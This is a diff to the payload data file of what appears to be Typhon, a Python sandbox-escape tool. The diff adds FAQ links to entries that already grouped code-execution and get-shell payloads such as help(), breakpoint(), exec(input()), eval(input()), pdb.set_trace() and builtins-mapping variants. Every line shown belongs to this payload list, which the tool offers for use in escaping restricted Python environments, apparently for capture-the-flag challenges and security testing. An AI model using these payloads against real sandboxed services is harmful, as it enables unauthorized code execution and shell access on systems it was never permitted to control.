@@ -3,8 +3,16 @@ RCE_data = {
     "user_defined_lambda": [["RANDOMVARNAME=lambda:RANDOMSTRING", ""]],
     "user_defined_class": [["class USER_DEFINED_CLASS:RANDOMSTRING", ""]],
     "directly_getshell": [
-        ["help()", "help"],
-        ["breakpoint()", "breakpoint"],
+        [
+            "help()",
+            "help",
+            "if you don't know how to use this payload, check: https://typhon.lamentxu.top/zh-cn/latest/FAQ.html#help-rce",
+        ],
+        [
+            "breakpoint()",
+            "breakpoint",
+            "if you don't know how to use this payload, check: https://typhon.lamentxu.top/zh-cn/latest/FAQ.html#breakpoint-rce",
+        ],
         ["exec(input())", "exec,input"],
         ["eval(input())", "eval,input"],
         ["compile(input(),RANDOMSTRING,'exec')", "compile,input"],
@@ -25,10 +33,26 @@ RCE_data = {
         ["import pdb;pdb.set_trace()", "BUILTINS_SET_CHANGED|BUILTINS_SET"],
     ],
     "builtins2RCEinput": [
-        ["BUILTINS_SET['help']()", "BUILTINS_SET"],
-        ["MODULE_BUILTINS.help()", "MODULE_BUILTINS"],
-        ["BUILTINS_SET['breakpoint']()", "BUILTINS_SET"],
-        ["MODULE_BUILTINS.breakpoint()", "MODULE_BUILTINS"],
+        [
+            "BUILTINS_SET['help']()",
+            "BUILTINS_SET",
+            "if you don't know how to use this payload, check: https://typhon.lamentxu.top/zh-cn/latest/FAQ.html#help-rce",
+        ],
+        [
+            "MODULE_BUILTINS.help()",
+            "MODULE_BUILTINS",
+            "if you don't know how to use this payload, check: https://typhon.lamentxu.top/zh-cn/latest/FAQ.html#help-rce",
+        ],
+        [
+            "BUILTINS_SET['breakpoint']()",
+            "BUILTINS_SET",
+            "if you don't know how to use this payload, check: https://typhon.lamentxu.top/zh-cn/latest/FAQ.html#breakpoint-rce",
+        ],
+        [
+            "MODULE_BUILTINS.breakpoint()",
+            "MODULE_BUILTINS",
+            "if you don't know how to use this payload, check: https://typhon.lamentxu.top/zh-cn/latest/FAQ.html#breakpoint-rce",
+        ],
         ["BUILTINS_SET['exec'](BUILTINS_SET['input']())", "BUILTINS_SET"],
         ["MODULE_BUILTINS.exec(MODULE_BUILTINS.input())", "MODULE_BUILTINS"],
         ["BUILTINS_SET['eval'](BUILTINS_SET['input']())", "BUILTINS_SET"],
